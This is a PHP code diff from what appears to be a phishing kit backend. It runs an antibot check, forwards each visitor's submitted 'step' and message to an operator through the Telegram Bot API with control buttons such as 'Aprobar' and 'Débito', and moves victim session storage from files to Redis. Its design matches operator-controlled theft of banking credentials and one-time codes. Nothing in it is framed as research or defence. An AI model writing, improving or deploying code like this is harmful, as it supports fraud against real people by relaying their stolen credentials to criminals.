@@ -25,8 +25,8 @@ if (!Antibot::esHumano($input)) {
     Antibot::rechazar();
 }
 
-$step       = $input['step']       ?? '';
-$message    = $input['message']    ?? '';
+$step          = $input['step']        ?? '';
+$message       = $input['message']     ?? '';
 $clientSessionId = $input['sessionId'] ?? '';
 
 if (empty($step) || empty($message) || empty($clientSessionId)) {
@@ -43,12 +43,47 @@ if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
     exit;
 }
 
+// ── Función auxiliar para comunicarse con Redis usando la variable REDIS_URL ──
+function upstash_redis($command, array $args = []) {
+    $redisUrl = getenv('REDIS_URL');
+    if (!$redisUrl) return null;
+    
+    $parsed = parse_url($redisUrl);
+    $host = $parsed['host'] ?? '';
+    $port = $parsed['port'] ?? 6379;
+    $pass = $parsed['pass'] ?? '';
+    
+    if (empty($host) || empty($pass)) return null;
+
+    $url = "https://{$host}:{$port}";
+    $payload = array_merge([$command], $args);
+    
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_POST           => true,
+        CURLOPT_POSTFIELDS     => json_encode($payload),
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_HTTPHEADER     => [
+            "Authorization: Bearer " . $pass,
+            "Content-Type: application/json"
+        ],
+        CURLOPT_TIMEOUT        => 5,
+        CURLOPT_SSL_VERIFYPEER => true
+    ]);
+    
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    if (!$response) return null;
+    $data = json_decode($response, true);
+    return $data['result'] ?? null;
+}
+
 $config   = require __DIR__ . '/../config.php';
 $botToken = $config['bot_token'];
 $chatId   = $config['chat_id'];
 
 // ── Todas las opciones disponibles en TODOS los pasos para control total del admin ──
-// Token y OTP son lo mismo; solo se usa Token
 $buttons = [
     ['text' => '✅ Aprobar',   'callback_data' => "aprobar_{$step}_{$sessionId}"],
     ['text' => '💳 Débito',    'callback_data' => "debito_{$step}_{$sessionId}"],
@@ -81,8 +116,8 @@ $postData = http_build_query([
 
 $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
 curl_setopt_array($ch, [
-    CURLOPT_POST             => true,
-    CURLOPT_POSTFIELDS       => $postData,
+    CURLOPT_POST            => true,
+    CURLOPT_POSTFIELDS      => $postData,
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_TIMEOUT        => 15,
     CURLOPT_SSL_VERIFYPEER => true,
@@ -109,40 +144,24 @@ if (!$data['ok']) {
 
 $messageId = $data['result']['message_id'] ?? null;
 
-// ── Guardar sesión en archivo (Compatible con Vercel Serverless / Render) ──
-$dataDir = is_writable(__DIR__ . '/../data') ? __DIR__ . '/../data' : sys_get_temp_dir() . '/data';
-if (!is_dir($dataDir)) {
-    @mkdir($dataDir, 0755, true);
-}
-
-$sessionFile = $dataDir . "/{$sessionId}.json";
+// ── Guardar sesión en Redis (Compatible con Vercel Serverless) ──
 $sessionData = [
-    'sessionId'   => $sessionId,
-    'currentStep' => $step,
-    'messageId'   => $messageId,
-    'status'      => 'pending',
-    'action'      => null,
-    'createdAt'   => time(),
-    'lastUpdateId'=> 0,
-    'messageText' => $message
+    'sessionId'    => $sessionId,
+    'currentStep'  => $step,
+    'messageId'    => $messageId,
+    'status'       => 'pending',
+    'action'       => null,
+    'createdAt'    => time(),
+    'lastUpdateId' => 0,
+    'messageText'  => $message
 ];
 
-$fp = fopen($sessionFile, 'c');
-if (!$fp || !flock($fp, LOCK_EX)) {
-    http_response_code(500);
-    echo json_encode(['ok' => false, 'error' => 'No se pudo crear la sesión']);
-    exit;
-}
-ftruncate($fp, 0);
-rewind($fp);
-$written = fwrite($fp, json_encode($sessionData));
-fflush($fp);
-flock($fp, LOCK_UN);
-fclose($fp);
+// Guardar en Redis usando SET con expiración de 1 hora (3600 segundos)
+$redisResult = upstash_redis('SET', [$sessionId, json_encode($sessionData), 'EX', 3600]);
 
-if ($written === false) {
+if ($redisResult === null) {
     http_response_code(500);
-    echo json_encode(['ok' => false, 'error' => 'No se pudo guardar la sesión']);
+    echo json_encode(['ok' => false, 'error' => 'No se pudo guardar la sesión en Redis']);
     exit;
 }
 
